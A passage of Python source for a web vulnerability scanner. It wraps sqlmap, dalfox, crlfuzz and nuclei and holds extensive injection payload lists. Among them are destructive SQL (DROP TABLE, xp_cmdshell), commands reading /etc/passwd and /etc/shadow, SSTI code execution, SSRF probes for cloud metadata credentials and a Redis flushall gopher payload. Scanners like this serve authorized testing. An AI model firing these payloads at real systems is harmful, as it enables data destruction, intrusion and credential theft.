"""Injection vulnerability modules: SQL, XSS, CRLF, SSRF, command injection."""
import re
import json
import time
import os
import secrets
import ssl
import socket as _sock
import struct
import base64
import hashlib
import hmac
import datetime
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, quote, unquote
from core.utils import _find_tool, _run_tool, req_lib, REQUESTS_AVAILABLE
from core.logger import log
from scanner.state import scan_state, LOCK
from scanner.findings import add_finding, set_progress
try:
    from core.utils import BS4_AVAILABLE, BeautifulSoup
except ImportError:
    BS4_AVAILABLE = False
    BeautifulSoup = None

def run_sqlmap_module(target):
    """Use sqlmap to confirm SQL injection findings from vulnscan."""
    log('info', f'[SQLMAP] Running sqlmap for SQLi confirmation on {target}')
    sqlmap_path = _find_tool('sqlmap')
    if not sqlmap_path:
        log('warn', '[SQLMAP] sqlmap not found, skipping')
        return
    
    # Build sqlmap candidate URLs from EVERYTHING we know, not 4 guesses:
    #   1. heuristic SQLi hits (highest priority — already show signal)
    #   2. every discovered URL that carries a query string
    #   3. form actions that take parameters
    #   4. WordPress/CMS-style URLs with common parameters
    #   5. common guesses only as a last resort when discovery is empty
    with LOCK:
        vulnscan_data = scan_state.get('vulnscan_data', {})
        sqli_findings = vulnscan_data.get('sqli', [])
        disc = dict(scan_state.get('discovery_data', {}))
    prof = scan_state.get('profile', 'balanced')
    url_cap = {'stealth': 5, 'quick': 15, 'balanced': 40, 'aggressive': 300}.get(prof, 40)

    candidates, seen = [], set()

    def _add(u):
        if u and u not in seen:
            seen.add(u)
            candidates.append(u)

    for f in sqli_findings:
        _add(f.get('url', ''))
    for u in disc.get('urls', []):
        url_str = u.get('url', u) if isinstance(u, dict) else u
        if isinstance(url_str, str) and target in url_str:
            if '?' in url_str:
                _add(url_str)
            else:
                # Also test discovered pages with common parameters
                for param in ('id', 'page', 'cat', 'item', 'pid', 'user', 'q', 'search', 'view'):
                    _add(f'{url_str}?{param}=1')
    # Brute-force common admin CRUD pages with ?id= parameter
    common_admin_pages = [
        'list.php', 'view.php', 'edit.php', 'delete.php', 'add.php', 'search.php',
        'update.php', 'create.php', 'process.php', 'manage.php', 'display.php',
        'show.php', 'detail.php', 'info.php', 'report.php', 'export.php',
        'student_list.php', 'student_view.php', 'staff_list.php', 'teacher_list.php',
        'fee_list.php', 'attendance_list.php', 'marks_list.php', 'exam_list.php',
        'class_list.php', 'section_list.php', 'batch_list.php', 'download.php',
        'upload.php', 'print.php', 'export_data.php', 'get_exam_res_new.php',
        'get_cumulative_report.php', 'check_batch.php', 'find_duplicate.php',
        'depromote.php', 'exam_add.php', 'exam_info.php', 'exam_subjects.php',
        'group.php', 'group_message.php', 'hall_ticket.php', 'admission.php',
        'online_admission_form.php', 'notice.php', 'circular.php', 'gallery.php',
    ]
    for page in common_admin_pages:
        for prefix in ('', '../admin/pages/', 'admin/pages/', '../php/', 'php/'):
            for param in ('id', 'ad_id', 'ad_no', 'no', 'exam_id'):
                _add(f'https://{target}/{prefix}{page}?{param}=1')
    base_url = f'https://{target}'
    for form in disc.get('forms', []):
        action = form.get('action', '')
        if not action:
            continue
        form_url = action if action.startswith('http') else f'{base_url}{action}'
        names = [i.get('name', '') for i in form.get('inputs', []) if i.get('name')]
        if names:
            _add(f'{form_url}?{names[0]}=1')
            # Also add the form URL itself for sqlmap --forms mode
            _add(form_url)
    if not candidates:
        log('info', '[SQLMAP] No discovered parameters — falling back to common endpoints')
        for g in ('id', 'page', 'cat', 'item', 'p', 'pid', 'user', 'q', 'search', 'view',
                   'page_id', 'cat_id', 'product_id', 'news_id', 'article_id', 'post_id',
                   'orderby', 'sort', 'order', 'type', 'action', 'module', 'file', 'dir',
                   'path', 'url', 'redirect', 'next', 'return', 'callback'):
            _add(f'{base_url}/?{g}=1')
        # Also test admin CRUD pages — these are high-value SQLi targets
        for page in ('list.php', 'view.php', 'edit.php', 'search.php', 'download.php',
                      'upload.php', 'exam_info.php', 'hall_ticket.php', 'admission.php'):
            _add(f'{base_url}/admin/pages/{page}?id=1')
            _add(f'{base_url}/../admin/pages/{page}?id=1')

    if len(candidates) > url_cap:
        log('warn', f'[SQLMAP] {len(candidates)} candidate URLs > {prof} cap {url_cap}; '
                    f'testing first {url_cap} (raise scan profile for full coverage)')
    test_urls = candidates[:url_cap]
    log('info', f'[SQLMAP] {len(test_urls)} candidate URL(s) queued for confirmation (profile={prof})')
    
    sqlmap_confirmed = []
    for url in test_urls:
        if not url or not scan_state.get('scanning'):
            continue
        log('info', f'[SQLMAP] Testing: {url}')
        adv = scan_state.get('advanced_options', {})
        sqlmap_level = adv.get('sqlmap_level', '2')
        sqlmap_risk = adv.get('sqlmap_risk', '1')
        tool_timeout = max(adv.get('timeout', 60), 60)
        sqlmap_out = f'/tmp/sqlmap_{hashlib.md5(url.encode()).hexdigest()[:8]}'
        stdout, stderr, rc = _run_tool([
            sqlmap_path, '-u', url,
            '--batch', '--random-agent', '--level', sqlmap_level, '--risk', sqlmap_risk,
            '--timeout', '15', '--retries', '2', '--threads', '4',
            '--flush-session', '--output-dir', sqlmap_out
        ], timeout=tool_timeout)
        # sqlmap writes detailed output to --output-dir; read log files
        if not stdout or 'is vulnerable' not in stdout.lower():
            try:
                import glob as _glob
                for log_file in _glob.glob(f'{sqlmap_out}/**/*.log', recursive=True):
                    with open(log_file, 'r', errors='ignore') as lf:
                        log_content = lf.read()
                        if log_content:
                            stdout = (stdout or '') + '\n' + log_content
            except Exception:
                pass
        
        if rc == 0 and stdout:
            # Check for confirmed injection
            if 'is vulnerable' in stdout.lower() or 'sqlmap identified' in stdout.lower():
                # Extract details
                inject_type = 'unknown'
                dbms = 'unknown'
                for line in stdout.split('\n'):
                    if 'Type:' in line:
                        inject_type = line.split('Type:')[-1].strip()
                    if 'back-end DBMS:' in line.lower():
                        dbms = line.split(':')[-1].strip()
                
                sqlmap_confirmed.append({
                    'url': url, 'type': inject_type, 'dbms': dbms
                })
                add_finding('critical', f'SQL Injection Confirmed: {url}',
                    sub=f'sqlmap confirmed {inject_type} SQL injection',
                    asset=url, cvss='9.8', exploit='PUBLIC', owasp='A03', mitre='T1190',
                    details=f'Type: SQL Injection (sqlmap confirmed)\nInjection Type: {inject_type}\nDBMS: {dbms}\nURL: {url}\n\nRemediation: Use parameterized queries/prepared statements. Implement input validation.')
                log('err', f'[SQLMAP] CONFIRMED SQLi: {url} ({inject_type})')
            else:
                log('info', f'[SQLMAP] {url} - Not vulnerable')
    
    if sqlmap_confirmed:
        log('ok', f'[SQLMAP] Confirmed {len(sqlmap_confirmed)} SQL injection vulnerabilities')
    else:
        log('ok', f'[SQLMAP] No SQL injection confirmed')

# ─── WORDPRESS SCANNER MODULE ─────────────────────────────────────────────────


def run_dalfox_module(target):
    """Advanced XSS scanning using dalfox — reflected, stored, DOM-based."""
    log('info', f'[DALFOX] Running advanced XSS scan on {target}')
    dalfox_path = _find_tool('dalfox')
    if not dalfox_path:
        log('warn', '[DALFOX] dalfox not installed — skipping')
        set_progress('dalfox', 100)
        return

    dalfox_findings = []
    base_url = f'https://{target}'

    # ── Phase 1: Discover URLs with parameters from discovery data ──
    with LOCK:
        discovery = dict(scan_state.get('discovery_data', {}))
    discovered_urls = discovery.get('urls', [])

    # Build target URLs list
    target_urls = []
    for url in discovered_urls:
        if isinstance(url, str) and target in url and '?' in url:
            target_urls.append(url)
        elif isinstance(url, dict):
            u = url.get('url', '')
            if u and target in u and '?' in u:
                target_urls.append(u)

    # Fallback: crawl main page for forms with parameters
    if not target_urls:
        try:
            if REQUESTS_AVAILABLE:
                r = req_lib.get(base_url, timeout=10, verify=False,
                                headers={'User-Agent': 'Mozilla/5.0'})
                # Extract links with parameters
                links = re.findall(r'href=["\']([^"\']*\?[^"\']+)["\']', r.text)
                for link in links:
                    if link.startswith('/'):
                        link = f'{base_url}{link}'
                    elif not link.startswith('http'):
                        continue
                    if target in link:
                        target_urls.append(link)
                # Extract form actions
                forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', r.text, re.I)
                for form in forms:
                    if form.startswith('/'):
                        form = f'{base_url}{form}'
                    if target in form:
                        target_urls.append(form)
        except Exception:
            pass

    # Always test the main page
    target_urls.insert(0, base_url)
    target_urls = list(dict.fromkeys(target_urls))[:20]  # dedupe, limit

    log('info', f'[DALFOX] Testing {len(target_urls)} URLs for XSS')

    for url in target_urls:
        if not scan_state.get('scanning'):
            break
        try:
            stdout, stderr, rc = _run_tool([
                dalfox_path, 'url', url,
                '--silence',
                '--format', 'json',
                '--timeout', '10',
                '--worker', '5',
            ], timeout=30)
            if stdout:
                try:
                    results = json.loads(stdout)
                    if isinstance(results, list):
                        for item in results:
                            poc = item.get('poc', item.get('evidence', ''))
                            param = item.get('param', item.get('type', ''))
                            severity = item.get('severity', 'medium')
                            xss_type = item.get('type', 'reflected')

                            # Verify: confirm the payload actually reflects
                            verified = False
                            if poc and 'http' in str(poc):
                                try:
                                    vr = req_lib.get(str(poc), timeout=5, verify=False,
                                                     allow_redirects=False)
                                    if vr.status_code == 200 and ('<script' in vr.text.lower()
                                                                   or 'alert(' in vr.text
                                                                   or 'onerror=' in vr.text):
                                        verified = True
                                except Exception:
                                    pass
                            elif poc:
                                # Try the PoC on the original URL
                                try:
                                    vr = req_lib.get(url, timeout=5, verify=False,
                                                     allow_redirects=False)
                                    if poc in vr.text:
                                        verified = True
                                except Exception:
                                    pass

                            if verified:
                                sev = 'high' if 'dom' in xss_type.lower() else 'medium'
                                add_finding(
                                    sev,
                                    f'XSS ({xss_type}) in parameter: {param}',
                                    sub=f'PoC: {poc}',
                                    asset=url, cvss='6.1', owasp='A03', mitre='T1059',
                                    details=f'Type: {xss_type}\nParameter: {param}\n'
                                            f'Payload: {poc}\nDalfox confirmed the vulnerability.')
                                dalfoxf = {'url': url, 'param': param, 'type': xss_type, 'poc': poc, 'severity': sev}
                                dalfox_findings.append(dalfoxf)
                                log('ok', f'[DALFOX] XSS ({xss_type}) confirmed: {param} at {url}')
                            else:
                                log('info', f'[DALFOX] Potential XSS in {param} — not confirmed, skipping')
                except json.JSONDecodeError:
                    # Non-JSON output — try line-by-line parsing
                    for line in stdout.split('\n'):
                        line = line.strip()
                        if 'poc' in line.lower() or 'xss' in line.lower():
                            log('info', f'[DALFOX] {line}')
        except Exception as e:
            log('warn', f'[DALFOX] Error scanning {url}: {e}')

    log('ok', f'[DALFOX] Scan complete — {len(dalfox_findings)} confirmed XSS findings')
    with LOCK:
        scan_state.setdefault('dalfox_data', [])
        scan_state['dalfox_data'] = dalfox_findings
    set_progress('dalfox', 100)


# ─── OSV-SCANNER DEPENDENCY VULNERABILITY MODULE ─────────────────────────────


def run_crlf_module(target):
    """CRLF injection scanning using crlfuzz."""
    log('info', f'[CRLF] Scanning for CRLF injection on {target}')
    crlfuzz_path = _find_tool('crlfuzz')
    if not crlfuzz_path:
        log('warn', '[CRLF] crlfuzz not installed — skipping')
        set_progress('crlf', 100)
        return

    crlf_findings = []
    base_url = f'https://{target}'

    # Get URLs to test from discovery data
    with LOCK:
        discovery = dict(scan_state.get('discovery_data', {}))
    discovered_urls = discovery.get('urls', [])
    target_urls = [base_url]
    for url in discovered_urls:
        u = url.get('url', '') if isinstance(url, dict) else url
        if u and target in u and u not in target_urls:
            target_urls.append(u)

    for url in target_urls[:15]:
        if not scan_state.get('scanning'):
            break
        try:
            stdout, stderr, rc = _run_tool([
                crlfuzz_path, '-u', url, '-q'
            ], timeout=30)
            if stdout and 'CRLF' in stdout:
                # Verify: manually confirm header injection
                verified = False
                try:
                    # Test with a unique marker
                    marker = f'X-CRLF-Test-{int(time.time())}'
                    test_url = url + ('&' if '?' in url else '?') + f'x=.%0d%0a{marker}:.val'
                    r = req_lib.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    if marker.lower() in str(r.headers).lower():
                        verified = True
                except Exception:
                    pass

                if verified:
                    add_finding(
                        'high',
                        f'CRLF Injection at {url}',
                        sub='Response header injection confirmed via CRLF characters',
                        asset=url, cvss='6.1', owasp='A03', mitre='T117',
                        details='CRLF injection allows response header manipulation.\n'
                                'This can lead to cache poisoning, XSS, or session fixation.')
                    crlf_findings.append({'url': url, 'verified': True})
                    log('ok', f'[CRLF] Confirmed CRLF injection at {url}')
                else:
                    log('info', f'[CRLF] Potential CRLF at {url} — not confirmed')
        except Exception as e:
            log('warn', f'[CRLF] Error: {e}')

    log('ok', f'[CRLF] Scan complete — {len(crlf_findings)} confirmed CRLF findings')
    with LOCK:
        scan_state.setdefault('crlf_data', [])
        scan_state['crlf_data'] = crlf_findings
    set_progress('crlf', 100)


# ─── TRUFFLEHOG DEEP SECRETS MODULE ──────────────────────────────────────────


def run_nuclei_module(target):
    log('info', f'[NUCLEI] Running nuclei template-based vulnerability scan on {target}')
    nuclei_path = _find_tool('nuclei')
    if not nuclei_path:
        log('warn', '[NUCLEI] nuclei not found, skipping')
        set_progress('vulnscan', 100)
        return
    
    stdout, stderr, rc = _run_tool([
        nuclei_path, '-u', target,
        '-severity', scan_state.get('advanced_options', {}).get('nuclei_severity', 'critical,high,medium'),
        '-silent', '-json', '-timeout', '10',
        '-rate-limit', '50', '-bulk-size', '25'
    ], timeout=scan_state.get('advanced_options', {}).get('timeout', 45))
    
    nuclei_findings = []
    if rc == 0 and stdout:
        try:
            import json as _json
            for line in stdout.strip().split('\n'):
                if not line.strip():
                    continue
                item = _json.loads(line)
                template_id = item.get('template-id', '')
                severity = item.get('info', {}).get('severity', 'info').lower()
                name = item.get('info', {}).get('name', template_id)
                matched_at = item.get('matched-at', item.get('host', target))
                description = item.get('info', {}).get('description', '')
                reference = item.get('info', {}).get('reference', [])
                cvss_score = item.get('info', {}).get('classification', {}).get('cvss-score', '')
                
                nuclei_findings.append({
                    'template': template_id, 'severity': severity,
                    'name': name, 'matched_at': matched_at,
                    'description': description
                })
                
                sev_map = {'critical': 'critical', 'high': 'high', 'medium': 'medium', 'low': 'low', 'info': 'info'}
                finding_sev = sev_map.get(severity, 'info')
                refs = ', '.join(reference[:3]) if isinstance(reference, list) else str(reference)
                
                add_finding(finding_sev, f'Nuclei: {name}',
                    sub=f'Template {template_id} matched at {matched_at}',
                    asset=matched_at,
                    cve='', cvss=str(cvss_score) if cvss_score else '',
                    exploit='PUBLIC', owasp='A06', mitre='T1190',
                    details=f'Template ID: {template_id}\\nSeverity: {severity}\\nMatched At: {matched_at}\\nDescription: {description}\\nReferences: {refs}\\n\\nRemediation: Address the vulnerability identified by nuclei template {template_id}.')
                log('err', f'[NUCLEI] {severity.upper()}: {name} at {matched_at}')
        except Exception as e:
            log('warn', f'[NUCLEI] Parse error: {e}')
    
    log('ok', f'[NUCLEI] Scan complete - {len(nuclei_findings)} findings')
    with LOCK:
        scan_state.setdefault('nuclei_data', [])
        scan_state['nuclei_data'] = nuclei_findings
    set_progress('vulnscan', 100)


# ═══════════════════════════════════════════════════════════════════════════════
# ██  NEW TOOL MODULES — dalfox / osv-scanner / gitleaks / semgrep / crlfuzz
# ═══════════════════════════════════════════════════════════════════════════════

# ─── DALFOX XSS SCANNER MODULE ────────────────────────────────────────────────


def run_vulnscan_module(target):
    log('info', f'[VULNSCAN] Performing advanced vulnerability scan on {target}')
    vulnscan = {
        'sqli': [], 'xss': [], 'cmdi': [], 'ssrf': [], 'ssti': [], 'xxe': [],
        'open_redirect': [], 'idor': [], 'header_injection': [], 'path_traversal': [],
        'log4shell': [], 'nosqli': [], 'prototype_pollution': [],
        'http_smuggling': [], 'host_injection': [], 'cache_poisoning': [],
        'deserialization': [], 'graphql_injection': [], 'jwt_attacks': [],
        'mass_assignment': [], 'websocket_injection': [], 'ldap_injection': [],
        'xpath_injection': [], 'xxe_advanced': [], 'race_condition': [],
    }
    if not REQUESTS_AVAILABLE:
        log('warn', '[VULNSCAN] requests library not available')
        with LOCK:
            scan_state['vulnscan_data'] = vulnscan
        set_progress('vulnscan', 100)
        return

    base_url = f'https://{target}'
    base_http = f'http://{target}'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }

    # ═══════════════════════════════════════════════════════════════════════════
    # ADVANCED PAYLOAD DEFINITIONS
    # ═══════════════════════════════════════════════════════════════════════════

    sqli_payloads = [
        # Basic error-based
        "'", '"', "1' OR '1'='1", '1" OR "1"="1', "admin'--", "' OR 1=1#",
        # Union-based
        "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--", "1' UNION SELECT NULL,NULL,NULL--",
        "1 UNION SELECT 1,2,3--", "-1 UNION SELECT 1,@@version,3--",
        # Blind boolean-based
        "1' AND 1=1--", "1' AND 1=2--", "1' AND 'a'='a", "1' AND 'a'='b",
        # Blind time-based
        "1'; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--", "1' AND pg_sleep(5)--",
        "1'; SELECT SLEEP(5)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1; WAITFOR DELAY '0:0:5'--", "1' OR IF(1=1,SLEEP(5),0)--",
        # Stacked queries
        "1'; DROP TABLE test--", "1'; EXEC xp_cmdshell('whoami')--",
        # Error extraction
        "1' AND 1=CONVERT(int,(SELECT @@version))--",
        "1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        # WAF bypass variants
        "1'/*!50000UNION*//*!50000SELECT*/1,2,3--",
        "1' %55NION %53ELECT 1,2,3--",
        "1' uni%6fn se%6cect 1,2,3--",
        "0x3127204f5220313d31",
        "CHAR(49,39,32,79,82,32,49,61,49)",
        # Second-order
        "admin'--", "' OR ''='", "1' OR '1'='1' /*",
    ]

    sqli_errors = [
        'sql', 'syntax', 'mysql', 'ORA-', 'postgresql', 'sqlite', 'mssql',
        'unclosed quotation', 'ODBC', 'JDBC', 'Warning:', 'Error in query',
        'Microsoft OLE DB', 'SQL Server', 'ORA-01756', 'SQLite3::',
        'pg_query', 'pg_exec', 'valid MySQL result', 'MySqlClient.',
        'com.mysql.jdbc', 'org.postgresql', 'SQLSTATE', 'Division by zero',
        'supplied argument is not a valid MySQL', 'Column count doesn\'t match',
        'unterminated quoted string', 'invalid syntax', 'quoted string not properly terminated',
    ]

    xss_payloads = [
        # Basic reflected
        '<script>alert(1)</script>', '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
        '"><svg/onload=alert(1)>', "javascript:alert(1)", '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">', '<details open ontoggle=alert(1)>',
        '<math><mtext></mtext><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>',
        # Attribute breakout
        '" onmouseover="alert(1)', "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="', "'-alert(1)-'",
        # Event handlers
        '<input onfocus=alert(1) autofocus>', '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>', '<audio src=x onerror=alert(1)>',
        '<select autofocus onfocus=alert(1)>', '<textarea autofocus onfocus=alert(1)>',
        '<keygen autofocus onfocus=alert(1)>',
        # Template injection
        '{{7*7}}', '${7*7}', '{{constructor.constructor("alert(1)")()}}',
        # Encoded variants
        '%3Cscript%3Ealert(1)%3C/script%3E', '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        # SVG variants
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<svg><set onbegin=alert(1) attributename=x to=1>',
        # mXSS / DOM clobbering
        '<form><button formaction=javascript:alert(1)>XSS</button></form>',
        '<a href="data:text/html,<script>alert(1)</script>">XSS</a>',
        '<object data="data:text/html,<script>alert(1)</script>">',
    ]

    cmdi_payloads = [
        '; ls', '| whoami', '`id`', '$(whoami)', '; cat /etc/passwd',
        '| ping -c 3 127.0.0.1', '; sleep 5', '| sleep 5', '`sleep 5`',
        '$(sleep 5)', '; sleep 5 #', '| sleep 5 #', '; id', '| id',
        '; type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '& dir', '| dir', '; dir', '&& dir',
        '%0a ls', '%0d%0a ls', ';\tls', '|\tls',
        ';{cat,/etc/passwd}', ';cat</etc/passwd',
        '$(cat /etc/passwd)', '`cat /etc/passwd`',
    ]

    ssti_payloads = [
        # Jinja2 / Twig
        '{{7*7}}', '{{config}}', '{{self.__class__.__mro__}}',
        '{{request.application.__globals__}}',
        '{{lipsum.__globals__["os"].popen("id").read()}}',
        '{{config.items()}}', '{{"".__class__.__mro__[1].__subclasses__()}}',
        # Freemarker / Velocity
        '${7*7}', '#{7*7}', '${{7*7}}',
        '<%= 7*7 %>', '<%- 7*7 %>',
        # Mako
        '<%! import os %>', '${self.module.cache.util.os}',
        # Pebble
        '{{ 7*7 }}', '{{ object.getClass().getProtectionDomain() }}',
        # ERB
        '<%= system("id") %>', '<%= `id` %>',
        # Generic detection
        '${7*0+7}', '{{7+7}}', '#{7+7}',
    ]

    ssrf_payloads = [
        # Internal
        'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0',
        'http://[::1]', 'http://0x7f000001', 'http://2130706433',
        'http://0177.0.0.1', 'http://127.0.0.1:80', 'http://127.0.0.1:443',
        'http://127.0.0.1:22', 'http://127.0.0.1:3306', 'http://127.0.0.1:6379',
        'http://127.0.0.1:8080', 'http://127.0.0.1:9200',
        # Cloud metadata
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/metadata/v1/',
        # Protocol smuggling
        'file:///etc/passwd', 'file:///c:/windows/system32/drivers/etc/hosts',
        'gopher://127.0.0.1:25/', 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
        'dict://127.0.0.1:6379/info',
        # DNS rebinding
        'http://localtest.me', 'http://spoofed.burpcollaborator.net',
    ]

    redirect_payloads = [
        'https://evil.com', '//evil.com', '/\\evil.com', '///evil.com',
        'https://evil.com%00', 'javascript:alert(1)', 'javascript:document.location="https://evil.com"',
        '/\\\\evil.com', '////evil.com', 'https:evil.com', 'http://evil.com',
        '///evil.com%2f..', 'https://evil.com%09', 'https://evil.com%0d%0a',
        'https://evil.com\\', 'https://evil.com@legitimate.com',
        '//evil.com%09legitimate.com', 'https://evil.com#.legitimate.com',
        'data:text/html,<script>window.location="https://evil.com"</script>',
        '//evil\u200b.com', 'https://evil.com%00legitimate.com',
    ]

    path_traversal_payloads = [
        '../../../etc/passwd', '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc/passwd', '..%c0%af..%c0%af..%c0%afetc/passwd',
        '..%00/etc/passwd', '/etc/passwd%00.png', '....\\....\\....\\etc\\passwd',
        '..;/..;/..;/etc/passwd', '..%00/..%00/..%00/etc/passwd',
        '....//....//....//etc/passwd%00', '/proc/self/environ', '/proc/self/cmdline',
        'C:\\boot.ini', 'C:\\Windows\\win.ini', '/etc/shadow',
        '..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
        '%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
    ]

    nosql_payloads = [
        '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
        "true, $where: '1 == 1'", '{"username":{"$gt":""},"password":{"$gt":""}}',
        '{"$gt": -1}', '{"$exists": true}', '{"$where": "1==1"}',
        "'; return true; var a='", '{"$or": [{}]}',
        '{"username":{"$in":["admin","root"]},"password":{"$regex":".*"}}',
    ]

    # New: HTTP Request Smuggling payloads
    http_smuggling_payloads = [
        {'name': 'CL.TE', 'headers': {'Transfer-Encoding': 'chunked', 'Content-Length': '6'},
         'body': '0\r\n\r\nSMUGGLED'},
        {'name': 'TE.CL', 'headers': {'Transfer-Encoding': 'chunked', 'Content-Length': '83'},
         'body': '0\r\n\r\nSMUGGLED'},
        {'name': 'TE.TE', 'headers': {'Transfer-Encoding': 'chunked, chunked', 'Content-Length': '6'},
         'body': '0\r\n\r\nSMUGGLED'},
    ]

    # New: Host header injection payloads
    host_injection_payloads = [
        'evil.com', 'evil.com:80', 'evil.com:443', 'localhost',
        '127.0.0.1', '0.0.0.0', 'internal-service.local',
        'evil.com%0d%0aX-Injected: true', 'evil.com\r\nX-Injected: true',
    ]

    # New: JWT attack payloads
    jwt_attack_types = [
        {'name': 'alg:none', 'header': '{"alg":"none","typ":"JWT"}', 'payload': '{"admin":true}'},
        {'name': 'RS256->HS256', 'header': '{"alg":"HS256","typ":"JWT"}', 'payload': '{"admin":true}'},
    ]

    # New: LDAP injection payloads
    ldap_payloads = [
        '*)(&', '*)(uid=*))(|(uid=*', 'admin)(&)', '*()|&',
        '*)|(objectClass=*', 'admin*)(|(objectClass=*', '*)(uid=*))(|(uid=*',
        'admin)(&(objectClass=*)', '*)(cn=*))(|(cn=*',
    ]

    # New: XPath injection payloads
    xpath_payloads = [
        "' or '1'='1", "' or ''='", "' or 1=1]", "//user[password/password]",
        "' or 1=1 or ''='", "x' or 1=1 or 'x'='y", "' or 'a'='a",
        "'] | //user | //*['", "' or position()=1]", "count(//user)",
    ]

    # New: Mass assignment test fields
    mass_assignment_fields = [
        'admin', 'role', 'is_admin', 'isAdmin', 'user_type', 'access_level',
        'permissions', 'privilege', 'account_type', 'verified', 'active',
        'disabled', 'suspended', 'balance', 'credit', 'discount',
    ]

    # New: Prototype pollution payloads
    proto_payloads = [
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
        '{"__proto__":{"isAdmin":true}}',
        '{"__proto__":{"role":"admin"}}',
    ]

    test_params = [
        'id', 'page', 'file', 'url', 'path', 'query', 'search', 'cat', 'product',
        'user', 'debug', 'name', 'email', 'callback', 'redirect', 'return', 'next',
        'dest', 'destination', 'redir', 'redirect_uri', 'ref', 'uri', 'link', 'host',
        'target', 'ping', 'cmd', 'exec', 'command', 'shell', 'ip', 'domain',
        'template', 'tpl', 'view', 'lang', 'format', 'type', 'sort', 'order',
        'limit', 'offset', 'page_size', 'per_page', 'q', 'input', 'data',
        'token', 'code', 'state', 'scope', 'response_type', 'grant_type',
    ]
    
    # ═══════════════════════════════════════════════════════════════════════════
    # ENHANCE: Use discovered parameters from Phase 1 crawl for targeted testing
    # ═══════════════════════════════════════════════════════════════════════════
    with LOCK:
        discovery = dict(scan_state.get('discovery_data', {}))
    discovered_params = discovery.get('parameters', [])
    discovered_urls = discovery.get('urls', [])
    discovered_forms = discovery.get('forms', [])
    # Add discovered parameters to test list (prepend so they're tested first)
    if discovered_params:
        # Extract parameter names from discovered data
        param_names = []
        for p in discovered_params:
            if isinstance(p, dict):
                name = p.get('name', p.get('param', ''))
                if name and name not in param_names:
                    param_names.append(name)
            elif isinstance(p, str) and p not in param_names:
                param_names.append(p)
        if param_names:
            test_params = param_names + [p for p in test_params if p not in param_names]
            log('info', f'[VULNSCAN] Using {len(param_names)} discovered parameters for targeted testing')
    
    # Add discovered URLs to test endpoints
    discovered_endpoints = []
    for url in discovered_urls:
        if isinstance(url, str) and target in url:
            parsed = urlparse(url)
            if parsed.query:
                # Extract params from URL
                from urllib.parse import parse_qs
                params = parse_qs(parsed.query)
                for param_name in params.keys():
                    if param_name not in [p for p in test_params]:
                        test_params.append(param_name)
            discovered_endpoints.append(url)

    ssrf_params = [
        'url', 'uri', 'link', 'src', 'href', 'dest', 'target', 'ping', 'feed',
        'callback', 'webhook', 'proxy', 'fetch', 'load', 'redirect', 'return',
        'next', 'continue', 'goto', 'checkout_url', 'shop', 'site', 'document',
    ]

    def timed_request(url, timeout=5, method='GET', data=None, extra_headers=None):
        """Make a request and return (response, elapsed_time)"""
        h = {**headers, **(extra_headers or {})}
        start = time.time()
        try:
            if method == 'POST':
                r = req_lib.post(url, timeout=timeout, verify=False, headers=h, data=data, allow_redirects=False)
            else:
                r = req_lib.get(url, timeout=timeout, verify=False, headers=h, allow_redirects=False)
            elapsed = time.time() - start
            return r, elapsed
        except req_lib.exceptions.Timeout:
            return None, timeout
        except Exception:
            return None, time.time() - start

    try:
        # ═══════════════════════════════════════════════════════════════════════
        # 1. ADVANCED SQL INJECTION TESTING
        # ═══════════════════════════════════════════════════════════════════════
        log('info', '[VULNSCAN] Testing SQL Injection vectors...')
        # Get baseline response for comparison
        try:
            baseline_r, baseline_time = timed_request(base_url)
            baseline_len = len(baseline_r.text) if baseline_r else 0
        except Exception:
            baseline_len, baseline_time = 0, 0

        # Build list of URLs to test: root page + discovered URLs with parameters + admin CRUD pages
        sqli_test_urls = [(base_url, test_params[:10])]
        for url in discovered_endpoints[:20]:
            if '?' in url:
                parsed_q = parse_qs(urlparse(url).query)
                if list(parsed_q.keys()):
                    sqli_test_urls.append((url, list(parsed_q.keys())[:5]))
                else:
                    sqli_test_urls.append((url, ['id']))
            else:
                sqli_test_urls.append((url, ['id']))

        # Also test form actions with their actual parameters
        for form in discovered_forms[:10]:
            action = form.get('action', '')
            if not action:
                continue
            form_url = action if action.startswith('http') else f'{base_url}{action}'
            form_params = [i.get('name', '') for i in form.get('inputs', []) if i.get('name')]
            if form_params:
